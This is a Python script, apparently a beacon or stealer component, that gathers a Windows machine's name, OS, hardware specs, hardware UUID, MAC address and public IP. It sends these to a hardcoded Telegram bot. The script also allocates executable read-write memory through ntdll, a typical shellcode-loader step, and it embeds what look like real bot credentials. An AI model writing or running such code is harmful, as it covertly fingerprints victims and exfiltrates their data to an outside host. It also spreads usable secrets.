import ctypes
import ctypes.wintypes as wintypes
import requests
import wmi
import psutil
import platform
import logging
import json

WI_FI_INTERFACE = "Wi-Fi"
HWID_COMMAND = 'wmic csproduct get uuid'
IP_API_URL = "https://api.ipify.org/?format=json"
CONTENT_TYPE_JSON = "application/json"
TELEGRAM_API_URL = "https://api.telegram.org/bot{}/sendMessage"

TELEGRAM_BOT_TOKEN = '6607283454:AAF6xvrd129QXkemIrZwbTkC7Fin1VfLbfg'
TELEGRAM_CHAT_ID = '-1002065237818'

def send_telegram_message(bot_token, chat_id, message):
    try:
        url = TELEGRAM_API_URL.format(bot_token)
        payload = {
            "chat_id": chat_id,
            "text": message,
            "parse_mode": "Markdown"
        }
        headers = {"Content-Type": CONTENT_TYPE_JSON}
        response = requests.post(url, headers=headers, json=payload)
        response.raise_for_status()
        logging.info("Mensaje enviado exitosamente a Telegram.")
    except requests.RequestException as e:
        logging.error(f"Error al enviar mensaje a Telegram: {str(e)}")
        
logging.basicConfig(level=logging.INFO)
if platform.system() == "Windows":
    ntdll = ctypes.WinDLL("ntdll")
    
    MEM_COMMIT = 0x1000
    MEM_RESERVE = 0x2000
    PAGE_EXECUTE_READWRITE = 0x40
    
    ntdll.NtAllocateVirtualMemory.argtypes = (
        wintypes.HANDLE,                 # Proceso
        ctypes.POINTER(ctypes.c_void_p), # Dirección base (salida)
        ctypes.POINTER(ctypes.c_ulong),  # ZeroBits (NULL)
        ctypes.POINTER(ctypes.c_size_t), # Tamaño de la región
        ctypes.c_ulong,                  # Flags (MEM_COMMIT | MEM_RESERVE)
        ctypes.c_ulong                   # Permisos (PAGE_EXECUTE_READWRITE)
    )
    ntdll.NtAllocateVirtualMemory.restype = ctypes.c_ulong  # Retorno (status)

    def allocate_memory():
        try:
            process_handle = wintypes.HANDLE(-1)  # Proceso actual (-1)
            base_addr = ctypes.c_void_p()  # Almacena la dirección base asignada
            zero_bits = ctypes.c_ulong(0)
            region_size = ctypes.c_size_t(0x1000)  # Tamaño de la memoria (4 KB)
            
            status = ntdll.NtAllocateVirtualMemory(
                process_handle, 
                ctypes.byref(base_addr),
                ctypes.byref(zero_bits),
                ctypes.byref(region_size),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE
            )
            
            if status == 0:
                return f"Memoria asignada en la dirección: {base_addr.value}"
            else:
                return f"Error en la asignación de memoria, código de estado: {status}"
        except Exception as e:
            return f"Error al intentar asignar memoria: {str(e)}"
else:
    def allocate_memory():
        return "Memoria no asignada (no Windows)"


def get_mac_address():
    try:
        for interface, addrs in psutil.net_if_addrs().items():
            if interface == WI_FI_INTERFACE:
                for addr in addrs:
                    if addr.family == psutil.AF_LINK:
                        return addr.address
        return "MAC no encontrada"
    except Exception as e:
        return f"Error al obtener MAC: {str(e)}"

def get_hwid():
    try:
        c = wmi.WMI()
        system_info = c.Win32_ComputerSystemProduct()[0]
        return system_info.UUID
    except Exception as e:
        return f"Error al obtener HWID: {str(e)}"

def get_public_ip():
    try:
        response = requests.get(IP_API_URL)
        response.raise_for_status()
        return response.json().get('ip', 'IP no disponible')
    except requests.RequestException as e:
        return f"Error al obtener la IP: {str(e)}"

def get_gpu_info():
    try:
        c = wmi.WMI()
        gpu_info = next((gpu.Description.strip() for gpu in c.Win32_VideoController()), "Unknown")
        return gpu_info
    except Exception as e:
        return f"Error al obtener GPU: {str(e)}"

def get_machine_info():
    try:
        mem = psutil.virtual_memory()
        machine_info = {
            "PC": platform.node(),
            "OS": platform.platform(),
            "RAM": f"{mem.total / 1024**3:.2f} GB",
            "GPU": get_gpu_info(),
            "CPU": platform.processor(),
            "HWID": get_hwid(),
            "MAC": get_mac_address(),
            "IP": get_public_ip(),
            "Memory Allocation Status": allocate_memory()
        }
        return machine_info
    except Exception as e:
        logging.error(f"Error al obtener la información del sistema: {str(e)}")
        return None

def format_message(machine_info):
    if not machine_info:
        return "Error al obtener la información del sistema."
    
    message = (
        "*Machine Info:*\n"
        f"PC: `{machine_info['PC']}`\n"
        f"OS: `{machine_info['OS']}`\n"
        f"RAM: `{machine_info['RAM']}`\n"
        f"GPU: `{machine_info['GPU']}`\n"
        f"CPU: `{machine_info['CPU']}`\n"
        f"HWID: `{machine_info['HWID']}`\n"
        f"MAC: `{machine_info['MAC']}`\n"
        f"IP: `{machine_info['IP']}`\n"
        f"Memory Allocation Status: `{machine_info['Memory Allocation Status']}`"
    )
    return message
def main():
    machine_info = get_machine_info()
    message = format_message(machine_info)
    send_telegram_message(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, message)

if __name__ == "__main__":
    main()
